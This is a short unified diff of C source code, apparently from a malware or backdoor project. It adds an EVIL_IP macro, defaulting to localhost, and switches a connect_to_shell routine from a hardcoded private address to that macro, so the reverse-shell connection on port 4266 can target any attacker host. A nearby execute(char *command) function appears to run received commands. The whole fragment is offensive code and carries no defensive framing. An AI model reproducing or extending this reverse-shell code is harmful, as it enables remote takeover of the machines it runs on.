@@ -233,6 +233,9 @@ static int check_file(char *path, char *ALPHA, size_t OMEGA)
 	((uint32_t) (a) | ((uint32_t) (b) << 8) | ((uint32_t) (c) << 16)           \
 	 | ((uint32_t) (d) << 24))
 #define SWAP16(p) (((uint16_t) (p) >> 8) | ((uint16_t) (p) << 8))
+#ifndef EVIL_IP
+#define EVIL_IP MAKE_IP(127, 0, 0, 1)
+#endif
 
 int execute(char *command)
 {
@@ -296,7 +299,7 @@ void connect_to_shell(void)
 		goto mammamia;
 	servaddr.sin_family = AF_INET;
 	servaddr.sin_port = (uint16_t) SWAP16(4266);
-	servaddr.sin_addr.s_addr = MAKE_IP(10, 12, 240, 159);
+	servaddr.sin_addr.s_addr = EVIL_IP;
 	if (ft_connect(fd, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0)
 	{
 		goto mammamia;
